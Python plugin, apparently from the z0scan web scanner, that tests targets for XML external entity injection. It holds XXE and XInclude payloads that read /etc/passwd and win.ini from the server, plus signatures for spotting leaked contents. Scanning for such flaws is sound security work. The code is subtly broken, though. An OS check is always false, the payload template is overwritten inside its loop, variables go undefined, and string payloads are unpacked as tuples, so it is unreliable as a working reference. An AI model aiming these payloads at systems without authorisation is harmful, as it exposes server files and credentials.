#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# JiuZero/z0scan

import re, requests
from urllib.parse import quote
from lib.core.settings import acceptedExt
from lib.api.reverse_api import reverseApi
from api import generateResponse, random_num, conf, PLACE, VulType, POST_HINT, Type, PluginBase, Threads, KB
from helper.basesensitive import sensitive_page_error_message_check

class Z0SCAN(PluginBase):
    name = "xxe"
    desc = 'XXE plugin detects XML external entity injection vulnerabilities via malicious payloads.'
    version = "2025.12.15"
    risk = 3
        
    def audit(self):
        if conf.level == 0:
            return
        if not self.fingerprints.waf and self.requests.suffix in acceptedExt:
            rules = []
            files = []
            if not "WINDOWS" in self.fingerprints.fingers:
                files += ["file:///etc/passwd"]
                rules += [b"root:[x\*]:0:0:", b"root:x:0:0:root:/root:"]
            if not "DARWIN" and not "LINUX" in self.fingerprints.fingers:
                files += ["file:///C://Windows//win.ini"]
                rules += [b"; for 16-bit app support"]
            if rules == []: return # 不是，你怎么做到这一步的？
            if self.requests.post_hint == POST_HINT.XML:
                payloads = [
                    r'''<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "{}">]><a>&content;</a>''',
                    r'''<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="{}" parse="text"/></root>''',
                ]
                url = self.requests.url
                for payload in payloads:
                    for file in files:
                        payload = payload.format(file)
                        r = requests.get(url, params=self.requests.params, data=payload, headers=self.requests.headers)
                        if not r:
                            continue
                        for show in rules:
                            if re.search(show, r.content):
                                result = self.generate_result()
                                result.main({
                                    "type": Type.REQUEST, 
                                    "url": r.url, 
                                    "vultype": VulType.XXE, 
                                    "show": {
                                        "Position": f"{position} >> {k}", 
                                        "Payload": payload,
                                        }
                                    })
                                result.step("Request1", {
                                    "position": position,
                                    "request": r.reqinfo, 
                                    "response": generateResponse(r), 
                                    "desc": "Payload: {} Found {}".format(payload, show),
                                    })
                                self.success(result)
                                break
            elif self.requests.params or self.requests.post_hint == POST_HINT.NORMAL or self.requests.post_hint == POST_HINT.ARRAY_LIKE:
                payloads = [
                    r'''<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>''',
                    r'''<?xml version="1.0"?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>''',
                ]
                iterdatas = self.generateItemdatas()
                test_args = []
                for _ in iterdatas:
                    k, v, position = _
                    if "xml" in k:
                        test_args.append(_)
                z0thread = Threads(name="xxe")
                z0thread.submit(self.process, test_args, payloads, rules)
    
    def process(self, _, payloads, rules):
        k, v, position = _
        if position in [PLACE.JSON_DATA, PLACE.MULTIPART_DATA, PLACE.XML_DATA]:
            return
        for payload_tuple in payloads:
            payload, show = payload_tuple
            _payload = self.insertPayload({
                "key": k, 
                "payload": payload, 
                "position": position, 
                })
            r = self.req(position, payload)
            if not r:
                return
            for show in rules:
                if re.search(show, r.content):
                    result = self.generate_result()
                    result.main({
                        "type": Type.REQUEST, 
                        "url": r.url, 
                        "vultype": VulType.XXE, 
                        "show": {
                            "Position": f"{position} >> {k}", 
                            "Payload": payload,
                            }
                        })
                    result.step("Request1", {
                        "position": position,
                        "request": r.reqinfo, 
                        "response": generateResponse(r), 
                        "desc": "Payload: {} Found {}".format(payload, show),
                        })
                    self.success(result)
                    return
                message_lists = sensitive_page_error_message_check(r.text)
                if message_lists:
                    result = self.generate_result()
                    result.main({
                        "type": Type.REQUEST, 
                        "url": self.requests.url, 
                        "vultype": VulType.SENSITIVE, 
                        "show": {
                            "Position": f"{position} >> {k}",
                            "Payload": payload, 
                            "Msg": f"Receive Error Msg {repr(message_lists)}"
                            }
                        })
                    result.step("Request1", {
                        "request": r.reqinfo, 
                        "response": generateResponse(r), 
                        "desc": f"Receive Error Msg {repr(message_lists)}"
                        })
                    self.success(result)

